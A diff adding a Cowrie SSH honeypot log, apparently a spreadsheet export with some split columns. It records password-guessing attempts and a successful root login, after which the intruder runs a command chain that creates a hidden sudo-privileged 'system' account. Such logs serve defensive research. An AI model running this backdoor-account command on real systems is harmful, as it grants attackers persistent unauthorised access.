@@ -1,0 +1,101 @@
+2023-11-27T04:04:03+0000	[-] Python Version 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]	Unnamed: 2	Unnamed: 3	Unnamed: 4
+2023-11-28T19:44:34+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
+2023-11-28T19:44:35+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
+2023-11-28T19:44:35+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' trying auth b'password'			
+2023-11-28T19:44:35+0000	[HoneyPotSSHTransport,22,175.206.47.218] Could not read etc/userdb.txt, default database activated			
+2023-11-28T19:44:35+0000	[HoneyPotSSHTransport,22,175.206.47.218] login attempt [b'admin'/b'Admin123'] failed			
+2023-11-28T19:44:36+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' failed auth b'password'			
+2023-11-28T19:44:36+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
+2023-11-28T19:44:36+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
+2023-11-28T19:44:36+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' trying auth b'password'			
+2023-11-28T19:44:36+0000	[HoneyPotSSHTransport,22,175.206.47.218] Could not read etc/userdb.txt, default database activated			
+2023-11-28T19:44:36+0000	[HoneyPotSSHTransport,22,175.206.47.218] login attempt [b'admin'/b'111111'] failed			
+2023-11-28T19:44:37+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' failed auth b'password'			
+2023-11-28T19:44:37+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
+2023-11-28T19:44:38+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
+2023-11-28T19:44:38+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' trying auth b'password'			
+2023-11-28T19:44:38+0000	[HoneyPotSSHTransport,22,175.206.47.218] Could not read etc/userdb.txt, default database activated			
+2023-11-28T19:44:38+0000	[HoneyPotSSHTransport,22,175.206.47.218] login attempt [b'admin'/b'test1234'] failed			
+2023-11-28T19:44:39+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' failed auth b'password'			
+2023-11-28T19:44:39+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
+2023-11-28T19:44:39+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
+2023-11-28T19:44:40+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' trying auth b'password'			
+2023-11-28T19:44:40+0000	[HoneyPotSSHTransport,22,175.206.47.218] Could not read etc/userdb.txt, default database activated			
+2023-11-28T19:44:40+0000	[HoneyPotSSHTransport,22,175.206.47.218] login attempt [b'admin'/b'admin123456'] failed			
+2023-11-28T19:44:41+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' failed auth b'password'			
+2023-11-28T19:44:41+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
+2023-11-28T19:44:41+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
+2023-11-28T19:44:41+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' trying auth b'password'			
+2023-11-28T19:44:41+0000	[HoneyPotSSHTransport,22,175.206.47.218] Could not read etc/userdb.txt, default database activated			
+2023-11-28T19:44:41+0000	[HoneyPotSSHTransport,22,175.206.47.218] login attempt [b'admin'/b'Admin'] failed			
+2023-11-28T19:44:42+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' failed auth b'password'			
+2023-11-28T19:44:42+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
+2023-11-28T19:44:43+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
+2023-11-28T19:44:43+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' trying auth b'password'			
+2023-11-28T19:44:43+0000	[HoneyPotSSHTransport,22,175.206.47.218] Could not read etc/userdb.txt, default database activated			
+2023-11-28T19:44:43+0000	[HoneyPotSSHTransport,22,175.206.47.218] login attempt [b'admin'/b'7ujMko0'] failed			
+2023-11-28T19:44:43+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost			
+2023-11-28T19:44:43+0000	[HoneyPotSSHTransport,22,175.206.47.218] Connection lost after 27 seconds			
+2023-11-28T19:44:44+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'admin' failed auth b'password'			
+2023-11-28T19:44:44+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
+2023-11-28T19:48:30+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1			
+2023-11-28T19:48:30+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256			
+2023-11-28T19:48:30+0000	[cowrie.ssh.factory.CowrieSSHFactory] New connection: 170.64.176.85:52490 (172.17.0.2:2222) [session:	9	43f	0e63e714]
+2023-11-28T19:48:30+0000	[HoneyPotSSHTransport,23,170.64.176.85] Remote SSH version: SSH-2.0-Go			
+2023-11-28T19:48:30+0000	[HoneyPotSSHTransport,23,170.64.176.85] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733	a		
+2023-11-28T19:48:30+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-n	is	tp2	56'
+2023-11-28T19:48:30+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'			
+2023-11-28T19:48:30+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'			
+2023-11-28T19:48:31+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS			
+2023-11-28T19:48:31+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
+2023-11-28T19:48:32+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'			
+2023-11-28T19:48:33+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'			
+2023-11-28T19:48:33+0000	[HoneyPotSSHTransport,23,170.64.176.85] Could not read etc/userdb.txt, default database activated			
+2023-11-28T19:48:33+0000	[HoneyPotSSHTransport,23,170.64.176.85] login attempt [b'root'/b'0'] succeeded			
+2023-11-28T19:48:33+0000	[HoneyPotSSHTransport,23,170.64.176.85] Initialized emulated server as architecture: linux-x64-lsb			
+2023-11-28T19:48:33+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'			
+2023-11-28T19:48:33+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'			
+2023-11-28T19:48:33+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
+2023-11-28T19:48:33+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
+2023-11-28T19:48:34+0000	[twisted.internet.defer#critical] Unhandled error in Deferred:			
+2023-11-28T19:48:34+0000	[twisted.internet.defer#critical]			
+"	Traceback (most recent"	call last):			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/internet/base.py"", line 705, in mainLoop"			
+"	    self.runUntilCurren"	t()			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/internet/base.py"", line 1090, in runUntilCurrent"			
+"	    call.func(*call.arg"	s, **call.kw)			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/internet/defer.py"", line 874, in callback"			
+"	    self._startRunCallb"	acks(result)			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/internet/defer.py"", line 981, in _startRunCallbacks"			
+"	    self._runCallbacks("	)			
+"	--- <exception caught h"	ere> ---			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/internet/defer.py"", line 1075, in _runCallbacks"			
+"	    current.result = ca"	llback(  # type: ignore[misc]			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/conch/ssh/userauth.py"", line 248, in _ebBadAuth"			
+"	    self.transport.send"	Packet(			
+"	  File ""/cowrie/cowrie-"	"git/src/cowrie/ssh/transport.py"", line 180, in sendPacket"			
+"	    self.transport.writ"	e(encPacket)			
+"	builtins.AttributeError"	: 'NoneType' object has no attribute 'write'			
+"	"				
+2023-11-28T19:48:34+0000	"[twisted.conch.ssh.session#info] Executing command ""b'apt update && apt install sudo curl -y && sudo"	us	era	"dd -m -p $(openssl passwd -1 byKz8qSH) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system'"""
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] CMD	:	apt	update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 byKz8qSH) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] CMD	:	ope	nssl passwd -1 byKz8qSH
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Can	't	fi	nd command openssl
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Com	ma	nd	not found: openssl passwd -1 byKz8qSH
+2023-11-28T19:48:34+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-11-28T19:48:34+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
+2023-11-28T19:48:34+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0			
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Can	't	fi	nd command apt
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Com	ma	nd	not found: apt update
+2023-11-28T19:48:34+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Can	't	fi	nd command apt
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Com	ma	nd	not found: apt install sudo curl -y
+2023-11-28T19:48:34+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Com	ma	nd	found: sudo useradd -m -p  system
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Com	ma	nd	found: sudo usermod -aG sudo system
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Can	't	fi	nd command usermod
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Can	't	fi	nd command -aG
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Com	ma	nd	found: sudo usermod -aG sudo system
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Can	't	fi	nd command usermod
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Can	't	fi	nd command -aG
+2023-11-28T19:48:34+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,23,170.64.176.85] Can	't	fi	nd command system
